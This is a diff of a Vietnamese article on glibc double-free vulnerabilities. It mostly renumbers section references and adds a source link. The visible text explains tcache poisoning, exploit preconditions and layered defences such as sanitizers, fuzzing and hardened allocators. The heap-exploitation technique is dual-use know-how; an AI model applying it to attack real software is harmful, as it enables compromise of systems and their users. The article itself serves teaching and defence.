-Ví dụ 5.4 kết thúc bằng một self-loop (`h → h`) — chính trạng thái đó là một dạng UAF: hai (hay nhiều) lần `malloc()` tiếp theo cùng trả về một vùng nhớ, cho attacker quyền ghi vào một chunk mà chương trình vẫn tin là "đã cấp phát hợp lệ". Đây chính là primitive mà kỹ thuật dưới đây khai thác tiếp — double free ở mục 5 không tự ghi đè được gì, nó chỉ *tạo ra* cơ hội ghi đè. Từ glibc 2.29, tcache phát hiện được cả `free(a); free(a)` trực tiếp (nhờ trường `key` + duyệt danh sách), nên muốn `malloc()` trả về một địa chỉ tự chọn, ta thường dùng **tcache poisoning**: làm hỏng con trỏ `next` của một chunk đã free để điều hướng lần cấp phát kế tiếp.
+Ví dụ 5.5 kết thúc bằng một self-loop (`h → h`) — chính trạng thái đó là một dạng UAF: hai (hay nhiều) lần `malloc()` tiếp theo cùng trả về một vùng nhớ, cho attacker quyền ghi vào một chunk mà chương trình vẫn tin là "đã cấp phát hợp lệ". Đây chính là primitive mà kỹ thuật dưới đây khai thác tiếp — double free ở mục 5 không tự ghi đè được gì, nó chỉ *tạo ra* cơ hội ghi đè. Từ glibc 2.29, tcache phát hiện được cả `free(a); free(a)` trực tiếp (nhờ trường `key` + duyệt danh sách), nên muốn `malloc()` trả về một địa chỉ tự chọn, ta thường dùng **tcache poisoning**: làm hỏng con trỏ `next` của một chunk đã free để điều hướng lần cấp phát kế tiếp.
 
 ### 6.1 Ràng buộc trên glibc hiện đại
 
@@ -300,7 +724,7 @@ Trên glibc 2.32+, câu hỏi không còn là "ghi đè `next` thế nào?" mà 
 
 ## 7. Điều kiện, cơ chế bảo vệ và giới hạn khả năng khai thác
 
-Double free bị allocator chặn (mục 5.3) không có nghĩa là hết đường khai thác — nó chỉ đẩy attacker sang tcache poisoning (mục 6). Nhưng tạo ra được chunk tại "địa chỉ tuỳ chọn" cũng không đồng nghĩa với chiếm được luồng thực thi: giữa hai điểm đó còn nhiều lớp bảo vệ độc lập với allocator. Phần này tách rõ ba câu hỏi: *cần gì để đi hết chuỗi khai thác*, *lớp nào đang chặn ở đâu*, và *tại sao vẫn có CVE thực tế* (mục 8).
+Double free bị allocator chặn (mục 5.4) không có nghĩa là hết đường khai thác — nó chỉ đẩy attacker sang tcache poisoning (mục 6). Nhưng tạo ra được chunk tại "địa chỉ tuỳ chọn" cũng không đồng nghĩa với chiếm được luồng thực thi: giữa hai điểm đó còn nhiều lớp bảo vệ độc lập với allocator. Phần này tách rõ ba câu hỏi: *cần gì để đi hết chuỗi khai thác*, *lớp nào đang chặn ở đâu*, và *tại sao vẫn có CVE thực tế* (mục 8).
 
 ### 7.1 Điều kiện cần để chuỗi khai thác đi hết chặng đường
 
@@ -380,13 +804,13 @@ Ba case dưới đây là minh chứng cho mục 7.3: dù đủ các lớp bảo
 
 ## 9. Biện pháp khắc phục và phòng ngừa
 
-Double free là lỗi về **quyền sở hữu vùng nhớ** (mục 5.1), nên biện pháp hiệu quả nhất nằm ở tầng thiết kế code, không chỉ ở tầng vá từng chunk. Dưới đây chia theo tầng, từ rẻ/sớm nhất đến tốn kém/muộn nhất.
+Double free là lỗi về **quyền sở hữu vùng nhớ** (mục 5.2), nên biện pháp hiệu quả nhất nằm ở tầng thiết kế code, không chỉ ở tầng vá từng chunk. Dưới đây chia theo tầng, từ rẻ/sớm nhất đến tốn kém/muộn nhất.
 
 ### 9.1 Tầng mã nguồn (ngăn lỗi phát sinh)
 
-- **Một con trỏ — một chủ sở hữu**: xác định rõ hàm/struct nào chịu trách nhiệm `free()`; tránh để hai con trỏ alias cùng trỏ một vùng nhớ mà không rõ ai free trước (mục 5.1).
+- **Một con trỏ — một chủ sở hữu**: xác định rõ hàm/struct nào chịu trách nhiệm `free()`; tránh để hai con trỏ alias cùng trỏ một vùng nhớ mà không rõ ai free trước (mục 5.2).
 - **`free()` xong, gán lại `NULL` ngay**: `free(NULL)` hợp lệ theo chuẩn C và không làm gì — cách rẻ nhất chặn phần lớn case thực tế (`free(p); p = NULL;`).
-- **Không `free()` trong nhánh lỗi rồi `free()` lại ở cleanup chung** (mẫu lỗi điển hình ở mục 5.1) — chọn một trong hai nơi chịu trách nhiệm, không cả hai.
+- **Không `free()` trong nhánh lỗi rồi `free()` lại ở cleanup chung** (mẫu lỗi điển hình ở mục 5.2) — chọn một trong hai nơi chịu trách nhiệm, không cả hai.
 - **C++**: dùng `std::unique_ptr`/`std::shared_ptr` thay con trỏ thô — compiler/runtime tự quản lý vòng đời, loại bỏ toàn bộ lớp lỗi double-free/UAF do thiết kế.
 - **Đa luồng**: nếu nhiều thread cùng tham chiếu một object, dùng refcount đúng (atomic) hoặc lock quanh free, không free "optimistic" dựa trên điều kiện race (như CVE-2025-62215, mục 8.3).
 
@@ -396,13 +820,13 @@ Double free là lỗi về **quyền sở hữu vùng nhớ** (mục 5.1), nên 
 - **Valgrind** (`--tool=memcheck`): chậm hơn ASan nhưng không cần biên dịch lại.
 - **`MALLOC_CHECK_=3`** (glibc): bật kiểm tra heap runtime nhẹ hơn ASan, dùng được cả với binary đã build sẵn.
 - **Static analysis** (Clang Static Analyzer, Coverity, Cppcheck): bắt một số pattern double-free tĩnh, hữu ích cho nhánh lỗi không được test cover.
-- **Fuzzing có ASan** (libFuzzer, AFL++): hiệu quả nhất với double-free phụ thuộc input — đúng mô tả ở mục 5.1 ("hai con trỏ alias", "đa luồng") thường chỉ lộ ra với input/lịch trình cụ thể.
+- **Fuzzing có ASan** (libFuzzer, AFL++): hiệu quả nhất với double-free phụ thuộc input — đúng mô tả ở mục 5.2 ("hai con trỏ alias", "đa luồng") thường chỉ lộ ra với input/lịch trình cụ thể.
 
 ### 9.3 Tầng allocator/runtime (giảm thiệt hại khi lỗi đã lọt)
 
 - glibc hiện đại tự có tcache `key` + safe-linking (mục 6.1) — không thay được code đúng, nhưng nâng chi phí khai thác.
 - **Hardened allocator** (hardened_malloc, Scudo, tcmalloc): có thể dùng làm drop-in (`LD_PRELOAD`), bổ sung kiểm tra double-free/canary chunk chặt hơn glibc mặc định — phù hợp khi không sửa được toàn bộ codebase cũ.
-- `GLIBC_TUNABLES=glibc.malloc.tcache_count=0`: chỉ nên dùng khi debug/nghiên cứu (mục 4), **không** dùng làm biện pháp phòng ngừa production — tắt tcache không sửa lỗi logic, chỉ đổi đường đi của nó (rơi xuống fastbin/unsorted bin, mục 5.4).
+- `GLIBC_TUNABLES=glibc.malloc.tcache_count=0`: chỉ nên dùng khi debug/nghiên cứu (mục 4), **không** dùng làm biện pháp phòng ngừa production — tắt tcache không sửa lỗi logic, chỉ đổi đường đi của nó (rơi xuống fastbin/unsorted bin, mục 5.5).
 
 ### 9.4 Tầng hệ thống/vận hành (giảm blast radius)
 
@@ -449,3 +873,4 @@ Tổng hợp các thuật ngữ đã dùng xuyên suốt mục 1–9, để tra 
 - Apache Software Foundation — [Apache HTTP Server 2.4 vulnerabilities](https://httpd.apache.org/security/vulnerabilities_24.html)
 - Rescana — [Phân tích CVE-2026-23918](https://www.rescana.com/post/critical-apache-http-server-2-4-66-vulnerability-cve-2026-23918-http-2-mod-http2-double-free-enables-dos-and-remote-code)
 - CISA — [Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
+- glibc - https://elixir.bootlin.com/glibc/glibc-2.26/
